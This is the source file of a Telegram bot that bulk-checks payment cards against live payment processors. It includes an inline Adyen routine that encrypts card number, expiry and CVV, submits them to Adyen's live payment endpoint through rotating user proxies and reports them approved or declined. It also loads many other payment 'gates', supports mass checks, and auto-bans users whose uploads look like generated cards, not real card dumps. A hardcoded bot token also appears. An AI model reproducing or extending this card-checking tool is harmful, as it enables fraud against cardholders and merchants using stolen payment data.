import asyncio
import concurrent.futures
import datetime
import html as _html
import importlib.util
import json
import os
import random
import re
import sys
import time
import logging
import httpx


class _DedupeList(list):
    """list subclass with O(1) __contains__ via an internal set.

    Replaces the plain `all_ccs = []` pattern used throughout the CC parsers.
    Without this, `if cc not in all_ccs` is O(n) per insertion, making the
    full parse O(n²).  On a 10 000-card file that's ~50 million list scans
    which blocks the asyncio event loop completely.
    """
    __slots__ = ("_set",)

    def __init__(self):
        super().__init__()
        self._set: set = set()

    def append(self, item):
        super().append(item)
        self._set.add(item)

    def __contains__(self, item):          # O(1) instead of O(n)
        return item in self._set


from aiogram import Bot, Dispatcher, types, Router, F
from aiogram.filters import Command, CommandStart
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus, MessageEntityType
from aiogram.exceptions import (
    TelegramRetryAfter,
    TelegramBadRequest,
    TelegramForbiddenError,
    TelegramNotFound,
)

# ── Patch aiogram session to strip dangerous deeply-nested JSON fields ────────
# Telegram can deliver "rich_message" / "rich_caption" blocks with recursively
# nested structures inside ordinary `message` updates.  Pydantic's remove_unset
# dict-comprehension then spins at 100% CPU indefinitely trying to walk the tree.
# We strip these fields from the raw response JSON before pydantic ever sees it.
import json as _json
from aiogram.client.session.base import BaseSession as _BaseSession

_DANGEROUS_KEYS = frozenset({"rich_message", "rich_caption", "story"})
_MAX_JSON_DEPTH  = 12   # anything deeper than 12 levels is sanitised away

def _sanitize(obj, depth: int = 0):
    if depth > _MAX_JSON_DEPTH:
        return {}
    if isinstance(obj, dict):
        return {
            k: _sanitize(v, depth + 1)
            for k, v in obj.items()
            if k not in _DANGEROUS_KEYS
        }
    if isinstance(obj, list):
        return [_sanitize(item, depth + 1) for item in obj]
    return obj

_orig_check_response = _BaseSession.check_response

def _patched_check_response(self, bot, method, status_code: int, content: str):
    try:
        raw = _json.loads(content)
        if isinstance(raw.get("result"), list):
            raw["result"] = [_sanitize(u) for u in raw["result"]]
            content = _json.dumps(raw)
    except Exception:
        pass
    return _orig_check_response(self, bot, method, status_code, content)

_BaseSession.check_response = _patched_check_response
# ── end patch ─────────────────────────────────────────────────────────────────

from helpers import (
    parse_proxy_format, test_proxy, bin_lookup,
    extract_cc, close_session, classify_gate_response,
    gate_is_charged, gate_is_approved, proxy_dict_to_url,
)
import checker_bridge
import auth
import auth
# ====== AYDEN MODULE (INLINE) ======
import base64 as _base64
from cryptography.hazmat.primitives import serialization as _serial, hashes as _hashes
from cryptography.hazmat.primitives.asymmetric import padding as _padding
from cryptography.hazmat.backends import default_backend as _default_backend

_ADYEN_CLIENT_KEY_URL = "https://checkoutshopper-live.adyen.com/checkoutshopper/v1/clientKeys"
_ADYEN_PAYMENT_URL    = "https://checkoutshopper-live.adyen.com/checkoutshopper/v1/payments"
_ADYEN_VERSION = "v71"
_ADYEN_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def _ayden_extract_session(url: str) -> str:
    for pat in [r'/sessions/([A-Za-z0-9_\-]+)', r'/payments/([A-Za-z0-9_\-]+)', r'sessionId=([A-Za-z0-9_\-]+)']:
        m = re.search(pat, url)
        if m:
            return m.group(1)
    raise ValueError(f"No session in URL: {url}")

def _ayden_fetch_pubkey(sess, proxy):
    r = sess.post(_ADYEN_CLIENT_KEY_URL, json={"version": _ADYEN_VERSION}, proxies=proxy, timeout=15)
    r.raise_for_status()
    return r.json()["publicKey"]

def _ayden_encrypt(cc, mm, yy, cvc, pubkey_str):
    pub = _serial.load_pem_public_key(pubkey_str.encode(), backend=_default_backend())
    def enc(v):
        ct = pub.encrypt(v.encode(), _padding.OAEP(mgf=_padding.MGF1(algorithm=_hashes.SHA256()), algorithm=_hashes.SHA256(), label=None))
        return _base64.b64encode(ct).decode()
    return {"encryptedCardNumber": enc(cc.replace(" ","")), "encryptedExpiryMonth": enc(mm.zfill(2)), "encryptedExpiryYear": enc(yy[-2:]), "encryptedSecurityCode": enc(cvc)}

def _ayden_parse(cc_str):
    p = cc_str.split("|")
    if len(p)!=4: raise ValueError("CC format: number|MM|YYYY|CVV")
    return p[0].strip(), p[1].strip(), p[2].strip(), p[3].strip()

async def ayden_process_payment(link, cc_str, proxy=None):
    try:
        sid = _ayden_extract_session(link)
        sess = requests.Session()
        sess.headers.update({"User-Agent": _ADYEN_UA})
        pk = _ayden_fetch_pubkey(sess, proxy)
        num, mm, yy, cvc = _ayden_parse(cc_str)
        enc = _ayden_encrypt(num, mm, yy, cvc, pk)
        payload = {"sessionId": sid, "paymentMethod": {"type": "scheme", **enc, "holderName": "John Doe"}, "browserInfo": {"userAgent": _ADYEN_UA, "acceptHeader": "*/*", "language": "en-US", "colorDepth": 24, "screenHeight": 1080, "screenWidth": 1920, "timeZoneOffset": -60, "javaEnabled": True}}
        r = sess.post(_ADYEN_PAYMENT_URL, json=payload, headers={"Content-Type": "application/json", "Origin": "https://checkoutshopper-live.adyen.com", "Referer": link}, proxies=proxy, timeout=30)
        rj = r.json()
        if r.status_code in (200,201,202):
            rc = rj.get("resultCode","Unknown")
            if rc=="Authorised": return {"status":"approved","response":"Authorised","cc":cc_str}
            if rc=="Refused": return {"status":"declined","response":rj.get("refusalReason","Refused"),"cc":cc_str}
            return {"status":rc.lower(),"response":rj.get("message",""),"cc":cc_str}
        return {"error":rj.get("message",f"HTTP {r.status_code}")[:100],"cc":cc_str}
    except Exception as e:
        return {"error":str(e)[:100],"cc":cc_str}
try:
    import webshare as _webshare_mod
    _WEBSHARE_AVAILABLE = True
except ImportError:
    _webshare_mod = None  # type: ignore
    _WEBSHARE_AVAILABLE = False

try:
    import dork as _dork_mod
    _DORK_AVAILABLE = True
except ImportError:
    _dork_mod = None  # type: ignore
    _DORK_AVAILABLE = False
import hit
import st
# import gameseal_auto
import rz
import chk
import vbv
import b3auth
try:
    import b3wrapunzel
except ImportError:
    b3wrapunzel = None  # optional — /b3 /mb3 /b3txt need b3wrapunzel.py on VPS
# import midasbuy


def _load_gate_file(filename: str):
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
    mod_name = "gate_" + re.sub(r"[^a-zA-Z0-9_]", "_", filename)
    spec = importlib.util.spec_from_file_location(mod_name, path)
    if not spec or not spec.loader:
        raise ImportError(f"Cannot load gate module: {filename}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


st1_gate = _load_gate_file("stripe1$.py")
try:
    skcvv = _load_gate_file(os.path.join("Session", "sk", "skcvv_fuction.py"))
except Exception:
    try:
        skcvv = _load_gate_file("skcvv_fuction.py")
    except Exception:
        skcvv = None  # optional — /skcvv /mskcvv /sktxt need skcvv_fuction.py

# ── Logging ───────────────────────────────────────────────────────────────────
# Writes to stdout AND two rotating files:
#   bot.log       — INFO+ (all activity)
#   bot_error.log — WARNING+ (errors only, easier triage)
from logging.handlers import RotatingFileHandler

_LOG_DIR  = os.path.dirname(os.path.abspath(__file__))
_LOG_FMT  = logging.Formatter(
    "%(asctime)s │ %(levelname)s │ %(name)s │ %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

_root = logging.getLogger()
_root.setLevel(logging.INFO)

_console = logging.StreamHandler()
_console.setFormatter(_LOG_FMT)
_root.addHandler(_console)

_file_all = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot.log"),
    maxBytes=10 * 1024 * 1024,   # 10 MB per file
    backupCount=5,                # keep 5 rotated files
    encoding="utf-8",
)
_file_all.setFormatter(_LOG_FMT)
_root.addHandler(_file_all)

_file_err = RotatingFileHandler(
    os.path.join(_LOG_DIR, "bot_error.log"),
    maxBytes=5 * 1024 * 1024,    # 5 MB
    backupCount=3,
    encoding="utf-8",
)
_file_err.setLevel(logging.WARNING)
_file_err.setFormatter(_LOG_FMT)
_root.addHandler(_file_err)

# Silence per-request httpx noise — these lines were burning ~30% CPU at 400 concurrent checks
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("hpack").setLevel(logging.WARNING)

log = logging.getLogger("bot")

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

TOKEN = "8993979155:AAHZlMoKpuIt6fWFeWENLusuWHEFsUXAgAk" 

# ── Join requirements ─────────────────────────────────────────────────────────
join_channel_id = --1003414638512       # Replace with your channel ID
join_chat_id    = --1003414638512       # Replace with your group ID

CHANNEL_LINK = "https://t.me/zeronumbars"
GROUP_LINK   = "https://t.me/zeronumbars"

# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(BASE_DIR, "proxy.json")
SITES_FILE = os.path.join(BASE_DIR, "sites.txt")
# Must match checker nodes (shp.py _SITES_MAP). Prefer this over sites.txt.
SITES_JSON = os.path.join(BASE_DIR, "sites.json")
STSITE_FILE = os.path.join(BASE_DIR, "stsite.json")
RZSITE_FILE = os.path.join(BASE_DIR, "rzsite.json")
SKKEYS_FILE = os.path.join(BASE_DIR, "skkeys.json")  # per-user Stripe SK+PK for /skcvv
BANNED_FILE            = os.path.join(BASE_DIR, "banned.json")
FREEPROXY_COOLDOWN_FILE = os.path.join(BASE_DIR, "freeproxy_cooldown.json")  # legacy
FREEPROXY_LAST_FILE     = os.path.join(BASE_DIR, "freeproxy_last.json")      # legacy
FREEPROXY_DATA_FILE     = os.path.join(BASE_DIR, "freeproxy_data.json")      # unified

# ── Ban system ────────────────────────────────────────────────────────────────
_banned_users: set[int] = set()

def _load_banned() -> None:
    global _banned_users
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            _banned_users = set(json.load(f))
    except Exception:
        _banned_users = set()

def _save_banned() -> None:
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_banned_users), f)
    except Exception as exc:
        log.error("Failed to save banned.json: %s", exc)

def is_banned(user_id: int) -> bool:
    return user_id in _banned_users

def ban_user(user_id: int) -> None:
    _banned_users.add(user_id)
    _save_banned()
    log.warning("BAN: user %s added to ban list", user_id)

def unban_user(user_id: int) -> None:
    _banned_users.discard(user_id)
    _save_banned()
    log.info("UNBAN: user %s removed from ban list", user_id)

_load_banned()

# ══════════════════════════════════════════════════════════════════════════════
#  GEN-CHECKER AUTO-BAN — filename + CC-pattern detection
# ══════════════════════════════════════════════════════════════════════════════

# Filename patterns that flag a gen-checker upload.
# The regex captures the matched keyword so it can be shown in the ban reason.
_GEN_FILENAME_PATTERN = re.compile(
    r'(gen(?:erat(?:e|or|ed)?)?)',
    re.IGNORECASE,
)

# Card-pattern thresholds (checked against first 20 cards of any batch)
_GEN_SAMPLE_SIZE  = 20   # inspect the first N cards
_GEN_NUM_BAN_MIN  = 15   # same card NUMBER must repeat ≥ this many times → ban
_GEN_CVV_BAN_MIN  = 15   # same CVV must repeat ≥ this many times → ban


def detect_gen_ccs(cards: list[str]) -> str | None:
    """
    Analyse the first 20 cards for generator patterns.
    Returns a human-readable reason string when detected, None if clean.

    Rules (as specified):
      1. Any card NUMBER that repeats ≥7 times in the sample → ban
         (fewer than 6 identical numbers = allowed through)
      2. Any CVV value that repeats ≥3 times in the sample → ban
         (real card dumps have cryptographically unique CVVs; any triple hit
         in 20 samples is almost certainly a gen tool)
    """
    from collections import Counter

    sample = cards[:_GEN_SAMPLE_SIZE]
    if len(sample) < 5:           # too few cards to make a reliable call
        return None

    parsed: list[tuple[str, str]] = []   # (card_number, cvv)
    for card in sample:
        parts = card.split("|")
        if len(parts) >= 4:
            parsed.append((parts[0].strip(), parts[3].strip()))

    if len(parsed) < 5:
        return None

    num_cnt = Counter(p[0] for p in parsed)
    cvv_cnt = Counter(p[1] for p in parsed)

    # Rule 1: same card number ≥7 times
    top_num, top_num_n = num_cnt.most_common(1)[0]
    if top_num_n >= _GEN_NUM_BAN_MIN:
        return f"Card number repeated {top_num_n}× in first {len(parsed)} cards"

    # Rule 2: same CVV ≥3 times
    top_cvv, top_cvv_n = cvv_cnt.most_common(1)[0]
    if top_cvv_n >= _GEN_CVV_BAN_MIN:
        return f"CVV '{top_cvv}' repeated {top_cvv_n}× in first {len(parsed)} cards"

    return None


async def _do_gen_ban(message: types.Message, user_id: int, reason: str, filename: str = "") -> None:
    """Execute the ban, notify user + owner, and log."""
    ban_user(user_id)
    full_name = message.from_user.first_name or "?"

    ban_msg = await message.reply(
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> '
        f'<b>You have been auto-banned.</b>\n'
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>',
        parse_mode="HTML",
    )
    try:
        await message.bot.pin_chat_message(
            message.chat.id, ban_msg.message_id, disable_notification=False
        )
    except Exception:
        pass

    file_line = (
        f'\n<tg-emoji emoji-id="5989971281758394805">📁</tg-emoji> '
        f'<b>File</b> ➜ <code>{_html.escape(filename)}</code>'
    ) if filename else ""
    notice = (
        f'<tg-emoji emoji-id="5116151848855667552">🚫</tg-emoji> <b>AUTO-BANNED</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'<tg-emoji emoji-id="5895421863114313930">👤</tg-emoji> <b>User</b> ➜ '
        f'<a href="tg://user?id={user_id}">{_html.escape(full_name)}</a> '
        f'(<code>{user_id}</code>)'
        f'{file_line}\n'
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> <b>Reason</b> ➜ '
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>'
    )

    # Notify owner + all admins
    recipients: list[int] = []
    if auth.OWNER_ID:
        recipients.append(auth.OWNER_ID)
    for admin_id in auth.load_admins():
        if admin_id not in recipients:
            recipients.append(admin_id)

    for recipient in recipients:
        try:
            await message.bot.send_message(recipient, notice, parse_mode="HTML")
        except Exception:
            pass

    log.warning("AUTO-BAN: user %s – %s", user_id, reason)


async def guard_gen_filename(message: types.Message, user_id: int) -> bool:
    """
    Returns True and bans the user when the filename contains a gen/scrape
    keyword.  The matched word is extracted and shown in the ban reason.
    Returns False when the file is clean.  Owners always pass through.
    """
    if auth.is_owner(user_id):
        return False

    doc = message.document or (
        message.reply_to_message and message.reply_to_message.document
    )
    name = (doc.file_name if doc and doc.file_name else "").strip()

    m = _GEN_FILENAME_PATTERN.search(name)
    if not m:
        return False

    matched_word = m.group(1)           # e.g. "gen", "generate", "scrape"
    ban_reason = f'Gen Checker — filename contains "{matched_word}"'
    await _do_gen_ban(message, user_id, ban_reason, filename=name)
    return True


async def guard_gen_cards(cards: list[str], message: types.Message, user_id: int) -> bool:
    """
    Inspect the first 30 cards for generator patterns.
    Returns True when the batch is clean (check may proceed).
    Returns False and bans the user when a gen pattern is detected.
    Owners are always allowed through.
    """
    if auth.is_owner(user_id):
        return True

    reason = detect_gen_ccs(cards)
    if reason is None:
        return True

    await _do_gen_ban(message, user_id, f"Gen CC Detected — {reason}")
    return False


# ── Thread pool for sync gates (hit, st, chk, rz, st1, etc.) ─────────────────
# 8-core bot VPS: 500 threads handles concurrent sync gate workers with headroom.
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=500)

# ── Per-user concurrency limiter for /msh (prevents one user starving others) ─
_USER_SEM_LIMIT = 100
_user_semaphores: dict[int, asyncio.Semaphore] = {}

def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _user_semaphores:
        _user_semaphores[user_id] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _user_semaphores[user_id]

# ── Antispam cooldown (20s per user for /sh, /msh, /br) ──────────────────────
_ANTISPAM_COOLDOWN = 20
_user_last_cmd: dict[int, float] = {}

def check_cooldown(user_id: int) -> float:
    """Return remaining cooldown seconds, or 0 if the user is free to proceed."""
    if auth.is_admin(user_id):
        return 0.0
    last = _user_last_cmd.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed < _ANTISPAM_COOLDOWN:
        return _ANTISPAM_COOLDOWN - elapsed
    return 0.0

def set_cooldown(user_id: int):
    _user_last_cmd[user_id] = time.time()

# ── Mass check batch size ─────────────────────────────────────────────────────
MSH_BATCH = 100
MSH_MAX_CCS = 100

# ══════════════════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI IDS
# ══════════════════════════════════════════════════════════════════════════════

E = {
    "bolt":      "5084974483685507801",
    "bolt2":     "5136449172806828766",
    "bolt3":     "5345941618623005800",
    "bolt4":     "5348503265967355284",
    "bolt5":     "5350298742685710886",
    "check":     "5278622189556354905",
    "check2":    "5895671830210940904",
    "check3":    "5197288647275071607",
    "cross":     "5042112436648281096",
    "cross2":    "5447644880824181073",
    "cross3":    "5121063440311386962",
    "cross4":    "6023909739669229757",
    "star":      "5980995951160987855",
    "gem":       "5226656353744862682",
    "globe":     "5134452506935427991",
    "link":      "5042101437237036298",
    "chat":      "5303138782004924588",
    "chat2":      "5040036030414062506",
    "link2":     "5201691993775818138",
    "user":      "5321304384838057247",
    "warn":      "5855207143724027916",
    "warn2":     "6008233706039284019",
    "rocket":    "5195033767969839232",
    "sparkle":   "5172739056592749710",
    "hourglass": "5215327832040811010",
    "plus":      "5253652327734192243",
    "dice":      "5361696340348779794",
    "refresh":   "5852670420074893746",
    "bank":      "5854784287013867183",
    "gift":      "6025929752982852543",
    "stop":      "6114014038960638990",
    "loading":   "5325834523068342417",
    "prev":      "4902349923049014048",
    "next":      "4902715076873553054",
    "help_prev": "5246943906645428644",
    "help_next": "5462965076413656490",
}

def pe(emoji_id: str) -> str:
    """Wrap a custom emoji ID into Telegram's premium emoji HTML tag."""
    return f'<tg-emoji emoji-id="{emoji_id}">⚡</tg-emoji>'

# ── Result-specific emojis (CC check output) ─────────────────────────────────
R = {
    "cc":         "5472250091332993630",
    "gate":       "6321225560789877992",
    "price":      "5039789890133296083",
    "bin_info":   "5775903905498010383",
    "visa":       "5298970748172385213",
    "master":     "5355269226732995665",
    "amex":       "4983234121556820510",
    "type":       "5350396951407895212",
    "level":      "5784914081165087232",
    "bank":       "5332455502917949981",
    "country":    "5285452600601237916",
    "checked_by": "5958417144877160497",
}

def brand_emoji(brand: str) -> str:
    """Return the premium emoji for a card brand, or empty string."""
    bl = brand.upper()
    if "VISA" in bl:
        return pe(R["visa"]) + " "
    elif "MASTER" in bl:
        return pe(R["master"]) + " "
    elif "AMEX" in bl or "AMERICAN" in bl:
        return pe(R["amex"]) + " "
    return ""

def user_link(user_id: int, name: str = "", username: str = "") -> str:
    """Build a clickable user profile link.

    Uses https://t.me/username when available (always clickable everywhere,
    including monitor groups where the user isn't a member).
    Falls back to tg://user?id= for users without a username.
    """
    # Display text: prefer name, then @username, then raw ID
    if name:
        display = _html.escape(name)
    elif username:
        display = f"@{_html.escape(username)}"
    else:
        display = str(user_id)

    # Link URL: prefer https://t.me/username (universally clickable),
    # fall back to tg://user?id= (only works when client knows the user)
    if username:
        url = f"https://t.me/{_html.escape(username)}"
    else:
        url = f"tg://user?id={user_id}"

    return f'<a href="{url}">{display}</a>'


# ══════════════════════════════════════════════════════════════════════════════
#  BOLD UNICODE TEXT CONVERTER
# ══════════════════════════════════════════════════════════════════════════════

_BOLD_MAP = {}
# Uppercase A-Z → 𝗔-𝗭 (U+1D5D4 to U+1D5ED)
for i, c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
    _BOLD_MAP[c] = chr(0x1D5D4 + i)
# Lowercase a-z → 𝗮-𝘇 (U+1D5EE to U+1D607)
for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _BOLD_MAP[c] = chr(0x1D5EE + i)
# Digits 0-9 → 𝟬-𝟵 (U+1D7EC to U+1D7F5)
for i, c in enumerate("0123456789"):
    _BOLD_MAP[c] = chr(0x1D7EC + i)

def bold(text: str) -> str:
    """Convert ASCII text to Unicode Mathematical Sans-Serif Bold."""
    return "".join(_BOLD_MAP.get(c, c) for c in text)


def _gate_msg_display(msg: str, limit: int = 120) -> str:
    """Strip HTML/JSON from gate responses so Telegram HTML parse_mode won't fail."""
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    if s.upper().startswith("DECLINED "):
        s = s[9:].strip()
    return bold((s[:limit] if s else "-"))


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY STORAGE  (proxy.json)
# ══════════════════════════════════════════════════════════════════════════════

_proxy_cache: dict | None = None
_proxy_cache_mtime: float = 0.0

def _load_proxies() -> dict:
    global _proxy_cache, _proxy_cache_mtime
    try:
        mt = os.path.getmtime(PROXY_FILE)
    except OSError:
        return {}
    if _proxy_cache is not None and mt == _proxy_cache_mtime:
        return _proxy_cache
    try:
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            _proxy_cache = json.load(f)
            _proxy_cache_mtime = mt
            return _proxy_cache
    except Exception:
        return {}

def _save_proxies(data: dict):
    global _proxy_cache, _proxy_cache_mtime
    with open(PROXY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    _proxy_cache = data
    try:
        _proxy_cache_mtime = os.path.getmtime(PROXY_FILE)
    except OSError:
        _proxy_cache_mtime = 0.0

MAX_PROXIES_PER_USER = 30

def get_user_proxies(user_id: int) -> list:
    """Return the full proxy list for a user (from proxy.json)."""
    data = _load_proxies()
    proxies = data.get(str(user_id), [])
    if isinstance(proxies, dict):
        proxies = [proxies] if proxies else []
    if isinstance(proxies, str):
        proxies = [proxies] if proxies.strip() else []
    out: list = []
    for p in proxies:
        if isinstance(p, dict):
            out.append(p)
        elif isinstance(p, str) and p.strip():
            parsed = parse_proxy_format(p.strip())
            if parsed:
                out.append(parsed)
    return out

def get_user_proxy(user_id: int) -> dict | None:
    """Return a RANDOM proxy from the user's list."""
    proxies = get_user_proxies(user_id)
    return random.choice(proxies) if proxies else None

def add_user_proxies(user_id: int, new_proxies: list[dict]):
    """Append proxies to user's list. Cap at MAX_PROXIES_PER_USER."""
    data = _load_proxies()
    existing = data.get(str(user_id), [])
    if isinstance(existing, dict):
        existing = [existing] if existing else []
    existing.extend(new_proxies)
    data[str(user_id)] = existing[:MAX_PROXIES_PER_USER]
    _save_proxies(data)

def del_user_proxy(user_id: int):
    data = _load_proxies()
    data.pop(str(user_id), None)
    _save_proxies(data)


# ══════════════════════════════════════════════════════════════════════════════
#  FREE PROXY DATA  (freeproxy_data.json)
#  Unified store: { "uid": { "claimed_at": ts, "proxies": ["ip:port:u:p", ...] } }
# ══════════════════════════════════════════════════════════════════════════════
FREEPROXY_COOLDOWN_HOURS = 24

def _load_fp_data() -> dict:
    """Load unified freeproxy data, migrating legacy files on first run."""
    try:
        with open(FREEPROXY_DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        pass
    # Migrate legacy files into unified format
    data: dict = {}
    try:
        with open(FREEPROXY_COOLDOWN_FILE, "r", encoding="utf-8") as f:
            cd = json.load(f)
        for uid, ts in cd.items():
            data.setdefault(uid, {})["claimed_at"] = ts
    except Exception:
        pass
    try:
        with open(FREEPROXY_LAST_FILE, "r", encoding="utf-8") as f:
            lp = json.load(f)
        for uid, proxies in lp.items():
            data.setdefault(uid, {})["proxies"] = proxies
    except Exception:
        pass
    return data

def _save_fp_data(data: dict) -> None:
    with open(FREEPROXY_DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def freeproxy_cooldown_remaining(user_id: int) -> float:
    """Returns seconds remaining in cooldown, or 0 if user can claim again."""
    data       = _load_fp_data()
    claimed_at = data.get(str(user_id), {}).get("claimed_at", 0)
    elapsed    = time.time() - claimed_at
    cooldown   = FREEPROXY_COOLDOWN_HOURS * 3600
    return max(0.0, cooldown - elapsed)

def freeproxy_set_claimed(user_id: int) -> None:
    data = _load_fp_data()
    data.setdefault(str(user_id), {})["claimed_at"] = int(time.time())
    _save_fp_data(data)

def _save_freeproxy_last(user_id: int, proxy_strings: list[str]) -> None:
    """Persist the last fetched proxy strings for a user (alongside cooldown)."""
    try:
        data = _load_fp_data()
        data.setdefault(str(user_id), {})["proxies"] = proxy_strings
        _save_fp_data(data)
    except Exception:
        pass

def _load_freeproxy_last(user_id: int) -> list[str]:
    """Load the last fetched proxy strings for a user."""
    try:
        return _load_fp_data().get(str(user_id), {}).get("proxies", [])
    except Exception:
        return []

# Temporary store for proxies fetched but not yet added (cleared after Add button click)
_freeproxy_pending: dict[int, list[dict]] = {}   # uid → parsed proxy dicts


# ══════════════════════════════════════════════════════════════════════════════
#  SITES LIST — source of truth = sites.json (same file shp.py uses on nodes)
#  sites.txt is kept as a flat URL dump for admin filter tools only.
# ══════════════════════════════════════════════════════════════════════════════

_sites_cache: list[str] | None = None
_sites_cache_mtime: float = 0.0
_sites_cache_src: str = ""


def _load_sites() -> list[str]:
    """Load Site URLs from sites.json (preferred) or fall back to sites.txt."""
    global _sites_cache, _sites_cache_mtime, _sites_cache_src

    src = SITES_JSON if os.path.isfile(SITES_JSON) else SITES_FILE
    try:
        mt = os.path.getmtime(src)
    except OSError:
        return []

    if (
        _sites_cache is not None
        and mt == _sites_cache_mtime
        and _sites_cache_src == src
    ):
        return _sites_cache

    urls: list[str] = []
    if src == SITES_JSON:
        try:
            with open(SITES_JSON, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                for entry in data:
                    site = (entry.get("Site") or "").strip().rstrip("/")
                    if site:
                        if not site.startswith("http"):
                            site = "https://" + site
                        urls.append(site)
            # Keep sites.txt in sync so admin /filter tools still work
            try:
                with open(SITES_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(urls) + ("\n" if urls else ""))
            except OSError:
                pass
        except Exception as exc:
            log.error("Failed to load sites.json: %s — falling back to sites.txt", exc)
            src = SITES_FILE
            try:
                mt = os.path.getmtime(SITES_FILE)
            except OSError:
                return []
            with open(SITES_FILE, "r", encoding="utf-8") as f:
                urls = [l.strip().rstrip("/") for l in f if l.strip()]
    else:
        with open(SITES_FILE, "r", encoding="utf-8") as f:
            urls = [l.strip().rstrip("/") for l in f if l.strip()]

    # Dedupe while preserving order
    seen: set[str] = set()
    deduped: list[str] = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            deduped.append(u)

    _sites_cache = deduped
    _sites_cache_mtime = mt
    _sites_cache_src = src
    log.info("Loaded %d sites from %s", len(deduped), os.path.basename(src))
    return _sites_cache


def get_random_site() -> str | None:
    sites = _load_sites()
    return random.choice(sites) if sites else None


# ══════════════════════════════════════════════════════════════════════════════
#  BOT + DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()
router = Router()
dp.include_router(router)
# dp.include_router(midasbuy.md_router)


# ══════════════════════════════════════════════════════════════════════════════
#  SAFE EDIT — wraps every edit_text call with flood-wait + error handling
# ══════════════════════════════════════════════════════════════════════════════

async def safe_edit(msg: types.Message, text: str, **kwargs) -> bool:
    """
    Drop-in replacement for msg.edit_text().
    Handles:
      • TelegramRetryAfter  — sleeps the required time and retries (up to 3×)
      • MessageNotModified  — silently ignored (content didn't change)
      • MessageCantBeEdited / MessageToEditNotFound — logged, silently skipped
      • TelegramForbiddenError — user blocked bot, logged
      • Any other exception — logged as error, execution continues
    Returns True on success, False on permanent failure.
    """
    for attempt in range(2):   # max 1 retry — progress edits are cosmetic, not worth 74s blocks
        try:
            await msg.edit_text(text, **kwargs)
            return True
        except TelegramRetryAfter as e:
            wait = min(e.retry_after + 1, 15)   # cap at 15s — never block a worker for 74s
            log.warning("⏳ FloodWait %ss on edit (attempt %s) — sleeping", wait, attempt + 1)
            await asyncio.sleep(wait)
        except TelegramBadRequest as e:
            emsg = str(e).lower()
            if "message is not modified" in emsg:
                return True   # same content, not an error
            if any(x in emsg for x in (
                "message can't be edited",
                "message to edit not found",
                "chat not found",
                "message_id_invalid",
            )):
                log.debug("safe_edit skipped (stale msg): %s", e)
                return False
            log.error("safe_edit TelegramBadRequest: %s", e)
            return False
        except TelegramForbiddenError as e:
            log.warning("safe_edit Forbidden (user blocked bot?): %s", e)
            return False
        except TelegramNotFound as e:
            log.debug("safe_edit NotFound: %s", e)
            return False
        except Exception as e:
            log.error("safe_edit unexpected error: %s", e, exc_info=True)
            return False
    log.error("safe_edit gave up after retries (persistent FloodWait)")
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL ERROR HANDLER — catches any unhandled exception inside a handler
#  so one bad update never kills the whole polling loop
# ══════════════════════════════════════════════════════════════════════════════

@dp.errors()
async def global_error_handler(event: types.ErrorEvent):
    exc = event.exception
    update = event.update

    if isinstance(exc, TelegramRetryAfter):
        log.warning("🚦 Global FloodWait %ss — bot will auto-retry", exc.retry_after)
        await asyncio.sleep(exc.retry_after + 1)
        return True   # tell aiogram to retry the update

    if isinstance(exc, TelegramForbiddenError):
        log.warning("🚫 Forbidden (user blocked bot): %s", exc)
        return True   # swallow — nothing we can do

    # Log everything else with full traceback to bot_error.log
    log.error(
        "❌ Unhandled exception in update %s:\n%s",
        getattr(update, "update_id", "?"),
        exc,
        exc_info=True,
    )
    return True   # returning True = "handled", prevents aiogram from crashing


# ══════════════════════════════════════════════════════════════════════════════
#  PER-USER THROTTLE MIDDLEWARE
#  Prevents a single user from triggering >3 commands/second, which would
#  cause a burst of Telegram API calls and a FloodWait cascade.
# ══════════════════════════════════════════════════════════════════════════════

from aiogram import BaseMiddleware as _BaseMiddleware

class _ThrottleMiddleware(_BaseMiddleware):
    """Rate-limit + auto-ban spammers.

    • Drops updates from manually/auto-banned users instantly (no response).
    • Auto-bans anyone who sends >_AUTO_BAN_LIMIT events within _AUTO_BAN_WINDOW seconds.
